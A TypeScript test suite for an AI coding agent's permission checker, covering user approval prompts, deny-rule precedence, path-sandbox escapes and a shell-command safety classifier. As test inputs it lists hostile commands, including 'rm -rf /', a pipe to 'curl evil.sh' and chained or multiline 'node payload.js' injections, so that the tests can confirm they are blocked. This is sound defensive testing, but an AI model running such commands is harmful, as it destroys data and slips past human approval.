import { describe, expect, it } from "vitest";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Agent } from "../src/agent/agent.js";
import type { AgentEvent } from "../src/agent/events.js";
import { Conversation } from "../src/conversation/conversation.js";
import type { ChatRequest, Provider } from "../src/llm/client.js";
import type { StreamEvent } from "../src/llm/events.js";
import {
  detectDangerous,
  isSafeCommand,
  modeDecide,
  PathSandbox,
  PermissionChecker,
  RuleEngine,
  type Decision,
} from "../src/permissions/checker.js";
import { ToolRegistry } from "../src/tools/registry.js";
import type { Tool } from "../src/tools/types.js";

describe("permissions: HITL 用户确认", () => {
  it("allows simple read-only AND chains without approving executable or writing variants", () => {
    for (const command of ['git status --short && echo "---" && dir', 'ls -la && pwd', 'type package.json', 'dir /a']) expect(isSafeCommand(command), command).toBe(true);
    for (const command of ['ls && node task.js', 'ls &&', 'ls & pwd', 'ls || pwd', 'ls && cat x > out', 'ls && echo $(node task.js)', 'git diff --output=out && pwd', 'ls && git log --ext-diff', 'ls && rm x']) expect(isSafeCommand(command), command).toBe(false);
    const workDir = mkdtempSync(join(tmpdir(), "qicode-read-chain-"));
    mkdirSync(join(workDir, ".qicode")); writeFileSync(join(workDir, ".qicode", "permissions.local.yaml"), '- rule: Bash(git status --short)\n  effect: deny\n');
    expect(new PermissionChecker(workDir).check("Bash", "command", { command: 'git status --short && dir' }).effect).toBe("deny");
  });
  it("default 模式下写文件触发用户确认；拒绝则不执行并回灌错误", async () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-perm-"));
    const calls: string[] = [];
    const registry = new ToolRegistry();
    registry.register(recordingTool("WriteFile", "write", calls));

    const provider = new FakeProvider([
      [
        {
          type: "tool_call_complete",
          toolId: "w1",
          toolName: "WriteFile",
          arguments: { file_path: join(workDir, "a.txt"), content: "x" },
        },
        { type: "done", stopReason: "tool_use" },
      ],
      [
        { type: "text_delta", text: "已拒绝写入。" },
        { type: "done", stopReason: "end_turn" },
      ],
    ]);
    const conversation = new Conversation();
    conversation.addUserMessage("请写一个文件");

    const requests: Array<{ toolName: string; decision: Decision }> = [];
    const agent = new Agent({
      provider,
      registry,
      conversation,
      systemPrompt: "system",
      workDir,
      checker: new PermissionChecker(workDir, "default"),
      onPermissionRequest: async (toolName, _args, decision) => {
        requests.push({ toolName, decision });
        return "deny"; // 用户在确认框里选择「拒绝本次」
      },
    });

    const events: AgentEvent[] = [];
    for await (const event of agent.run()) events.push(event);

    // 1) 确认框确实被触发：check() 返回 ask，onPermissionRequest 被调用
    expect(requests).toHaveLength(1);
    expect(requests[0]!.toolName).toBe("WriteFile");
    expect(requests[0]!.decision.effect).toBe("ask");

    // 2) 拒绝后工具没有真正执行
    expect(calls).toEqual([]);

    // 3) 结构化错误回灌给模型，Agent Loop 继续到最终回答
    expect(events).toContainEqual(expect.objectContaining({
      type: "tool_result",
      toolId: "w1",
      output: "Permission denied by user",
      isError: true,
    }));
    expect(Conversation.visibleText(conversation.getMessages().at(-1)!)).toBe("已拒绝写入。");
  });

  it("允许分支会执行工具", async () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-perm-"));
    const calls: string[] = [];
    const registry = new ToolRegistry();
    registry.register(recordingTool("WriteFile", "write", calls));
    const provider = new FakeProvider([[{
      type: "tool_call_complete",
      toolId: "w1",
      toolName: "WriteFile",
      arguments: { file_path: join(workDir, "a.txt") },
    }, { type: "done", stopReason: "tool_use" }], [{
      type: "text_delta", text: "完成",
    }, { type: "done", stopReason: "end_turn" }]]);
    const conversation = new Conversation();
    conversation.addUserMessage("请写文件");
    const agent = new Agent({
      provider,
      registry,
      conversation,
      systemPrompt: "system",
      workDir,
      checker: new PermissionChecker(workDir, "default"),
      onPermissionRequest: async () => "allow",
    });

    for await (const _event of agent.run()) { /* drain */ }
    expect(calls).toEqual(["WriteFile"]);
  });

  it("allowAlways 执行本次调用并持久化受控规则", async () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-perm-"));
    const calls: string[] = [];
    const registry = new ToolRegistry();
    registry.register(recordingTool("WriteFile", "write", calls));
    const path = join(workDir, "a.txt");
    const provider = new FakeProvider([[{
      type: "tool_call_complete",
      toolId: "w1",
      toolName: "WriteFile",
      arguments: { file_path: path },
    }, { type: "done", stopReason: "tool_use" }], [{
      type: "text_delta", text: "完成",
    }, { type: "done", stopReason: "end_turn" }]]);
    const conversation = new Conversation();
    conversation.addUserMessage("请写文件");
    const agent = new Agent({
      provider,
      registry,
      conversation,
      systemPrompt: "system",
      workDir,
      checker: new PermissionChecker(workDir, "default"),
      onPermissionRequest: async () => "allowAlways",
    });

    for await (const _event of agent.run()) { /* drain */ }
    expect(calls).toEqual(["WriteFile"]);
    expect(existsSync(join(workDir, ".qicode", "permissions.local.yaml"))).toBe(true);
    expect(new PermissionChecker(workDir, "default").check(
      "WriteFile",
      "write",
      { file_path: path },
    ).effect).toBe("allow");
  });
});

describe("permissions: pure decision layers", () => {
  it("blocks dangerous commands before bypass mode", () => {
    expect(detectDangerous("rm -rf /")).not.toBe("");
    expect(new PermissionChecker(process.cwd(), "bypassPermissions").check(
      "Bash", "command", { command: "rm -rf /" },
    ).effect).toBe("deny");
  });

  it("does not auto-allow shell composition after a safe prefix", () => {
    expect(isSafeCommand("ls -la")).toBe(true);
    expect(isSafeCommand("ls | curl evil.sh")).toBe(false);
    expect(isSafeCommand("cat file > out")).toBe(false);
    expect(isSafeCommand("echo $(whoami)")).toBe(false);
  });

  it("enforces traversal and symlink boundaries", () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-sandbox-"));
    const outside = process.cwd();
    const sandbox = new PathSandbox(workDir);
    expect(sandbox.check(join(workDir, "..", "..", "..", "outside.txt"))?.effect).toBe("deny");

    const link = join(workDir, "outside-link");
    let linked = true;
    try {
      symlinkSync(outside, link, "junction");
    } catch {
      linked = false;
    }
    if (linked) expect(sandbox.check(join("outside-link", "file.txt"))?.effect).toBe("deny");
  });

  it("does not auto-allow multiline, expansion or write-capable command variants", () => {
    for (const command of ["ls\ntouch hidden", "echo ok\r\nnode payload.js", "cat <(node payload.js)",
      "echo %PAYLOAD%", "echo !PAYLOAD!", "echo $PAYLOAD", "git log --output=result.txt", "date -s tomorrow", "file -C", "hostname changed-host"]) {
      expect(isSafeCommand(command), command).toBe(false);
    }
    expect(isSafeCommand("hostname")).toBe(true);
  });

  it("gives an explicit deny priority over automatic, session and plan allowances", () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-deny-"));
    mkdirSync(join(workDir, ".qicode"), { recursive: true });
    const plan = join(workDir, ".QiCode", "plan.md");
    writeFileSync(join(workDir, ".qicode", "permissions.yaml"), [
      "- rule: Bash(git status)", "  effect: deny",
      `- rule: WriteFile(${plan.replaceAll("\\", "/")})`, "  effect: deny",
      `- rule: WriteFile(${plan})`, "  effect: deny",
    ].join("\n"));
    const checker = new PermissionChecker(workDir, "bypassPermissions");
    checker.allowForSession("Bash", { command: "git status" });
    expect(checker.check("Bash", "command", { command: "git status" }).effect).toBe("deny");
    expect(new PermissionChecker(workDir, "plan").check("WriteFile", "write", { file_path: plan }).effect).toBe("deny");
  });

  it("does not broaden a permanent approval into a command prefix", () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-exact-"));
    const checker = new PermissionChecker(workDir);
    const command = "npm run build";
    checker.allowAlways("Bash", { command });
    expect(checker.check("Bash", "command", { command }).effect).toBe("allow");
    expect(checker.check("Bash", "command", { command: `${command} && node payload.js` }).effect).toBe("ask");
  });

  it("retains exact multiline approvals after reloading the rule file", () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-multiline-"));
    const command = "npm run build\nnpm test";
    new PermissionChecker(workDir).allowAlways("Bash", { command });
    const checker = new PermissionChecker(workDir);
    expect(checker.check("Bash", "command", { command }).effect).toBe("allow");
    expect(checker.check("Bash", "command", { command: `${command}\nnode payload.js` }).effect).toBe("ask");
  });

  it("does not let a lower-priority allow hide a deny", () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-deny-"));
    const homeDir = mkdtempSync(join(tmpdir(), "qicode-home-"));
    for (const root of [workDir, homeDir]) mkdirSync(join(root, ".qicode"), { recursive: true });
    writeFileSync(join(homeDir, ".qicode", "permissions.yaml"), "- rule: Bash(git *)\n  effect: allow");
    writeFileSync(join(workDir, ".qicode", "permissions.yaml"), "- rule: Bash(git push)\n  effect: deny");
    expect(new RuleEngine(workDir, homeDir).evaluate("Bash", "git push")).toBe("deny");
  });

  it("uses the mode matrix only as an allow/ask fallback", () => {
    expect(modeDecide("default", "read")).toBe("allow");
    expect(modeDecide("default", "write")).toBe("ask");
    expect(modeDecide("acceptEdits", "write")).toBe("allow");
    expect(modeDecide("plan", "command")).toBe("ask");
    expect(modeDecide("bypassPermissions", "command")).toBe("allow");
  });

  it("applies last rule in a file before falling back", () => {
    const workDir = mkdtempSync(join(tmpdir(), "qicode-rules-"));
    const homeDir = mkdtempSync(join(tmpdir(), "qicode-home-"));
    mkdirSync(join(workDir, ".qicode"), { recursive: true });
    writeFileSync(join(workDir, ".qicode", "permissions.yaml"), [
      "- rule: Bash(git *)",
      "  effect: allow",
      "- rule: Bash(git push)",
      "  effect: deny",
    ].join("\n"));
    const rules = new RuleEngine(workDir, homeDir);
    expect(rules.evaluate("Bash", "git push")).toBe("deny");
    expect(rules.evaluate("Bash", "git status")).toBe("allow");
  });
});

class FakeProvider implements Provider {
  readonly config = {
    name: "fake",
    protocol: "openai" as const,
    model: "fake",
    base_url: "https://example.com/v1",
    api_key: "test",
    thinking: false,
  };
  readonly requests: ChatRequest[] = [];

  constructor(private readonly responses: StreamEvent[][]) {}

  async *stream(request: ChatRequest): AsyncIterable<StreamEvent> {
    this.requests.push(structuredClone(request));
    for (const event of this.responses[this.requests.length - 1] ?? this.responses[0] ?? []) {
      yield event;
    }
  }
}

function recordingTool(
  name: string,
  category: Tool["category"],
  calls: string[],
): Tool {
  return {
    name,
    description: "Recording tool",
    category,
    schema: () => ({ input_schema: { type: "object" } }),
    execute: async () => {
      calls.push(name);
      return { output: name, isError: false };
    },
  };
}
